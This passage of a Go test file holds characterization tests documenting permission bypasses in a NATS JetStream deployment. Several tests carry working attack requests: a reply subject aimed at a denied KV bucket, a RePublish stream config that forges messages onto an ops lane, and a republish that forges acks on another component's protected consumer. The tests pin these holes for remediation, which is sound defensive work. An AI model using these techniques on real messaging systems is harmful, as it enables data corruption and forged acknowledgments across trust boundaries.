			t.Errorf("%q not found in Matrix — verticalAppNames has drifted from Matrix", name)
		}
	}
	for name := range jsAPIGrantRoster {
		if !seenRoster[name] {
			t.Errorf("jsAPIGrantRoster names %q, which is not a Matrix component", name)
		}
	}
}

// TestFacetPlainPublishLandsOnDeniedSubject pins the sharpest population
// correction §8 needed: the reply-subject write primitive is not gated on
// $JS.API.> at all. facet holds none — it is the narrowest user in the
// matrix (TestReplySubjectBypassIsNotAllowResponsesGated pins that) — yet an
// ORDINARY JetStream publish's PubAck is answered by the exact same
// perms == nil internal client (§8.3), so naming a denied subject as that
// publish's reply lands the PubAck JSON there regardless. The exposed
// population is therefore "publish on any JetStream-backed subject", which
// is all 18 components including facet, not "$JS.API.> holders" (17).
//
// The content distinction matters and is asserted explicitly: facet lands a
// server-CHOSEN PubAck envelope ({"stream":...,"seq":...}) — corruption of
// core-kv with a predictable shape — not attacker-chosen bytes like
// TestReplySubjectWriteAuthority's forgery. Both corrupt the bucket; only
// one can also forge arbitrary content.
//
// Characterization test, same posture as TestReplySubjectWriteAuthority:
// live, grounded (§8), invert rather than delete when the remedy lands.
func TestFacetPlainPublishLandsOnDeniedSubject(t *testing.T) {
	t.Parallel()
	url := startServerFromConf(t)

	boot := connectAs(t, url, "bootstrap")
	provision(t, boot, bootstrap.HealthKVBucket)
	provision(t, boot, bootstrap.CoreKVBucket)

	facet := connectAs(t, url, "facet")

	// Positive control: facet's own direct write to core-kv is denied — the
	// landing below is not an overlooked grant, it is the reply-subject
	// primitive reaching a bucket facet has no other path to.
	deniedCtx, cancel := context.WithTimeout(context.Background(), deniedTimeout)
	defer cancel()
	if _, err := facet.KVPut(deniedCtx, bootstrap.CoreKVBucket, "vtx.probe.facet-denied-control", []byte("forged")); err == nil {
		t.Fatal("facet KVPut core-kv: want transport denial, got success")
	}

	target := "vtx.probe.facet-puback"
	if err := facet.NATS().PublishRequest(
		"$KV."+bootstrap.HealthKVBucket+".health.facet.puback-probe",
		"$KV."+bootstrap.CoreKVBucket+"."+target, []byte("facet-publish-body-irrelevant")); err != nil {
		t.Fatalf("facet publish to its own health-kv key with reply=$KV.%s.%s: %v", bootstrap.CoreKVBucket, target, err)
	}
	if err := facet.NATS().Flush(); err != nil {
		t.Fatalf("flush: %v", err)
	}

	got, ok := pollKVValue(t, boot, bootstrap.CoreKVBucket, target, 8*time.Second)
	if !ok {
		t.Fatalf("%s key %q was never written — want the server's PubAck JSON landing there (§8, facet's $JS.API-free route)", bootstrap.CoreKVBucket, target)
	}
	if !bytes.Contains(got, []byte(`"stream"`)) || !bytes.Contains(got, []byte(`"seq"`)) {
		t.Errorf("%s key %q = %q, want a PubAck JSON body (stream/seq fields) — the server-chosen envelope this route corrupts the bucket with", bootstrap.CoreKVBucket, target, got)
	}
}

// TestStreamRepublishLandsForgedBytesOnOpsLane pins a related, and in one
// respect sharper, primitive than the reply-subject one: a stream's
// RePublish destination is emitted by the server's internal JetStream client
// with pa.subject = dest and an EMPTY deliver subject (unlike a consumer
// redelivery, which preserves the original subject — see
// TestPushConsumerDeliverSubjectDoesNotReachOpsLane), so the republished
// message's OWN subject becomes dest and a lane-filtered consumer sees it
// directly. No reply subject is chosen per-request at all here: the
// forwarding is wired once into the stream's config and then fires on every
// matching write thereafter. It also defeats protectedStreamDenies
// structurally, because the mirror source lives in the request BODY, so
// $JS.API.STREAM.CREATE.<attacker-chosen-name> is always subject-permitted
// regardless of which existing stream it mirrors.
//
// Characterization test, same posture as TestReplySubjectWriteAuthority:
// live, grounded (§8), invert rather than delete when the remedy lands.
func TestStreamRepublishLandsForgedBytesOnOpsLane(t *testing.T) {
	t.Parallel()
	url := startServerFromConf(t)

	boot := connectAs(t, url, "bootstrap")
	provision(t, boot, bootstrap.HealthKVBucket)
	provisionStream(t, boot, bootstrap.CoreOpsStreamName, []string{bootstrap.OpsWildcardSubject})

	app := connectAs(t, url, "clinic-app")

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	watch, err := boot.JetStream().CreateOrUpdateConsumer(ctx, bootstrap.CoreOpsStreamName, jetstream.ConsumerConfig{
		Durable:       "replysubj-republish-watch",
		FilterSubject: bootstrap.OpsWildcardSubject,
	})
	if err != nil {
		t.Fatalf("watch consumer on %s: %v", bootstrap.CoreOpsStreamName, err)
	}

	const mirrorName = "REPLYSUBJPROBE"
	createReq := fmt.Sprintf(
		`{"name":%q,"mirror":{"name":"KV_%s"},"republish":{"src":"$KV.%s.*.*.*","dest":"ops.default"},"storage":"memory"}`,
		mirrorName, bootstrap.HealthKVBucket, bootstrap.HealthKVBucket,
	)
	if _, err := app.NATS().Request("$JS.API.STREAM.CREATE."+mirrorName, []byte(createReq), 5*time.Second); err != nil {
		t.Fatalf("clinic-app raw STREAM.CREATE (mirror+republish onto ops.default): %v", err)
	}

	payload := []byte(`{"forged":"env.Actor"}`)
	writeHealthKey(t, app, "health.clinic-app.republish-probe", payload)

	if !pollForPayload(t, watch, payload, 8*time.Second) {
		t.Fatal("core-operations never captured the republished message on the ops lane — want the forged bytes landing there verbatim, under their own subject (§8, RePublish route)")
	}
}

// consumerInfoResponse decodes only the fields
// TestStreamRepublishForgesAckOnProtectedConsumer needs from a
// $JS.API.CONSUMER.INFO reply (nats-server's JSApiConsumerInfoResponse
// embeds *ConsumerInfo with no json tag, so its fields — including
// num_ack_pending — flatten onto the same top-level object as any error).
type consumerInfoResponse struct {
	Error *struct {
		Description string `json:"description"`
	} `json:"error"`
	NumAckPending int `json:"num_ack_pending"`
}

// fetchAckPending queries a core-events consumer's num_ack_pending via a raw
// CONSUMER.INFO request as bootstrap.
func fetchAckPending(t *testing.T, boot *substrate.Conn, consumerName string) int {
	t.Helper()
	resp, err := boot.NATS().Request("$JS.API.CONSUMER.INFO."+bootstrap.CoreEventsStreamName+"."+consumerName, nil, 3*time.Second)
	if err != nil {
		t.Fatalf("CONSUMER.INFO %s: %v", consumerName, err)
	}
	var info consumerInfoResponse
	if err := json.Unmarshal(resp.Data, &info); err != nil {
		t.Fatalf("CONSUMER.INFO %s: unmarshal %s: %v", consumerName, resp.Data, err)
	}
	if info.Error != nil {
		t.Fatalf("CONSUMER.INFO %s: server error: %s", consumerName, info.Error.Description)
	}
	return info.NumAckPending
}

// pollAckPendingEquals polls consumerName's num_ack_pending until it equals
// want, or timeout elapses — the positive half of the ack-forgery proof.
func pollAckPendingEquals(t *testing.T, boot *substrate.Conn, consumerName string, want int, timeout time.Duration) bool {
	t.Helper()
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		if fetchAckPending(t, boot, consumerName) == want {
			return true
		}
		time.Sleep(75 * time.Millisecond)
	}
	return false
}

// assertAckPendingStaysAt is the negative half: it polls repeatedly across
// the whole settling window and fails immediately the moment
// num_ack_pending drifts from want, rather than checking once at the end —
// there is no single blocking primitive for "wait and tell me if a value
// changed" the way Fetch's MaxWait gives the other negatives in this file,
// so this polls the condition itself instead of sleeping blindly.
func assertAckPendingStaysAt(t *testing.T, boot *substrate.Conn, consumerName string, want int, window time.Duration) {
	t.Helper()
	deadline := time.Now().Add(window)
	for time.Now().Before(deadline) {
		if got := fetchAckPending(t, boot, consumerName); got != want {
			t.Fatalf("%s: num_ack_pending drifted to %d during the settling window, want it to stay at %d", consumerName, got, want)
		}
		time.Sleep(150 * time.Millisecond)
	}
}

// TestStreamRepublishForgesAckOnProtectedConsumer pins RePublish's sharpest
// consequence: nats-server's ack processing does not check who published to
// an ack subject or how, only that a message with acceptable content
// arrived on it, so a RePublish destination pointed at a genuine, currently-
// pending ack subject acks that message exactly as if the real puller had.
// dest here is not a reply subject at all (isReservedReply's $JS.ACK. gate
// governs a CLIENT's chosen reply and never runs against it), and clinic-app
// needs no $JS.ACK.> grant to reach it — the ack subject arrives as a
// literal, fully-resolved string once, from a real delivery to the
// consumer's own legitimate owner, and the republish config is wired to
// that literal.
//
// Mirrors conf_test.go's TestCoreEventsAckPlaneSideChannel for the victim
// setup (owner-created consumer, a real published event, the front-way
// MSG.NEXT pull that yields the genuine v1 ack subject). The negative
// control — a second republish stream whose dest is an unrelated subject —
// is what makes the positive a proof rather than a coincidence of consumer
// bookkeeping.
//
// Characterization test, same posture as TestReplySubjectWriteAuthority:
// live, grounded (§8), invert rather than delete when the remedy lands.
func TestStreamRepublishForgesAckOnProtectedConsumer(t *testing.T) {
	t.Parallel()
	url := startServerFromConf(t)

	boot := connectAs(t, url, "bootstrap")
	provision(t, boot, bootstrap.HealthKVBucket)
	provisionStream(t, boot, bootstrap.CoreEventsStreamName, []string{"events.>"})

	pc := coreEventsProtectedConsumers[0] // privacy-worker, owned by processor
	owner := connectAs(t, url, pc.owner)
	createSubj := "$JS.API.CONSUMER.CREATE." + bootstrap.CoreEventsStreamName + "." + pc.name + ".events.>"
	createBody := []byte(`{"stream_name":"` + bootstrap.CoreEventsStreamName + `","config":{"durable_name":"` + pc.name + `","filter_subject":"events.>","ack_policy":"explicit"}}`)
	if _, err := owner.NATS().Request(createSubj, createBody, 3*time.Second); err != nil {
		t.Fatalf("%s CREATE own consumer %s: want success, got %v", pc.owner, pc.name, err)
	}
	t.Cleanup(func() {
		_, _ = boot.NATS().Request("$JS.API.CONSUMER.DELETE."+bootstrap.CoreEventsStreamName+"."+pc.name, []byte("{}"), 3*time.Second)
	})

	proc := connectAs(t, url, "processor")
	publishEvent := func(subject string) {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		if err := proc.Publish(ctx, subject, []byte(`{"probe":true}`), nil); err != nil {
			t.Fatalf("processor Publish %s: want success, got %v", subject, err)
		}
	}

	// The victim state: a real, currently-pending delivery, exactly as a
	// legitimate puller would leave one before acking it.
	publishEvent("events.replysubj.ackforge.1")
	delivered, err := owner.NATS().Request("$JS.API.CONSUMER.MSG.NEXT."+bootstrap.CoreEventsStreamName+"."+pc.name, msgNextWaitingPull, 3*time.Second)
	if err != nil {
		t.Fatalf("%s MSG.NEXT %s: want a delivered message, got %v", pc.owner, pc.name, err)
	}
	assertDeliveredMessage(t, pc.owner+" MSG.NEXT "+pc.name, delivered)
	ackSubject := delivered.Reply
	if !pollAckPendingEquals(t, boot, pc.name, 1, 3*time.Second) {
		t.Fatalf("%s: num_ack_pending never reached 1 after the unacked delivery — the victim setup is not what this test thinks it is", pc.name)
	}

	app := connectAs(t, url, "clinic-app")

	// Negative control: a republish destination that is NOT the ack subject
	// must not touch it, even though it fires from the same mechanism on
	// the same consumer's stream.
	const negStreamName = "REPLYSUBJACKCTRL"
	negReq := fmt.Sprintf(`{"name":%q,"mirror":{"name":"KV_%s"},"republish":{"src":"$KV.%s.*.*.*","dest":"harmless.subject"},"storage":"memory"}`,
		negStreamName, bootstrap.HealthKVBucket, bootstrap.HealthKVBucket)
	if _, err := app.NATS().Request("$JS.API.STREAM.CREATE."+negStreamName, []byte(negReq), 5*time.Second); err != nil {
		t.Fatalf("clinic-app STREAM.CREATE (negative control): %v", err)
	}
	writeHealthKey(t, app, "health.clinic-app.ackforge-control", []byte("irrelevant"))
	assertAckPendingStaysAt(t, boot, pc.name, 1, replySubjectSettleWindow)

	// Positive: dest is the real ack subject captured above. The forwarded
	// VALUE must be empty: nats-server's ack processing only recognizes a
	// zero-length body, "+ACK", or "+OK" as a plain acknowledgment
	// (server/consumer.go:2731) — arbitrary non-empty bytes match none of
	// processAck's cases and are silently ignored. This is a real constraint
	// on the forgery, not a weakening of it: the attacker does not control
	// the ack subject's role, only that health-kv accepts an empty value,
	// which it does.
	const posStreamName = "REPLYSUBJACKFORGE"
	posReq := fmt.Sprintf(`{"name":%q,"mirror":{"name":"KV_%s"},"republish":{"src":"$KV.%s.*.*.*","dest":%q},"storage":"memory"}`,
		posStreamName, bootstrap.HealthKVBucket, bootstrap.HealthKVBucket, ackSubject)
	if _, err := app.NATS().Request("$JS.API.STREAM.CREATE."+posStreamName, []byte(posReq), 5*time.Second); err != nil {
		t.Fatalf("clinic-app STREAM.CREATE (ack-forge): %v", err)
	}
	writeHealthKey(t, app, "health.clinic-app.ackforge-probe", []byte{})

	if !pollAckPendingEquals(t, boot, pc.name, 0, 8*time.Second) {
		t.Fatalf("%s: num_ack_pending never dropped to 0 — want clinic-app's republished write onto the captured ack subject %q to forge the ack (§8, RePublish route)", pc.name, ackSubject)
	}
}
